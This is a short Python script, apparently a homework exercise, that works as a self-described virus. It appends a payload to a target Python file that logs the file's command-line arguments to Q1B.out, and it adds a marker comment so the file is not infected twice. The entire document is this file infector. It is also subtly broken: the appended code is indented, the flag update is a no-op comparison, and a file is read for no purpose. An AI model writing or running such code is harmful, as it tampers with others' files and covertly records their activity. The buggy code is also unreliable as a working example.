import sys

if len(sys.argv) != 2:
    print("Need to enter Python file as argument!")
    sys.exit(1)

infected = False

virus = '''
    import sys
    with open("Q1B.out", "a") as txt_file:
        for arg in sys.argv:
            txt_file.write(arg + ' ')
        txt_file.write('\\n')
'''

flag = '''# Infect by virus'''
with open(sys.argv[1], 'r') as file:
    for line in file:
        if flag in line:
            infected = True

with open(sys.argv[1], 'a') as file:
    if infected == False:
        file.write(virus)
        file.write(f'\n{flag}\n')
        infected == True

with open("Q1B.py", "r") as virus_file:
    virus_file = virus_file.read()

print(infected)

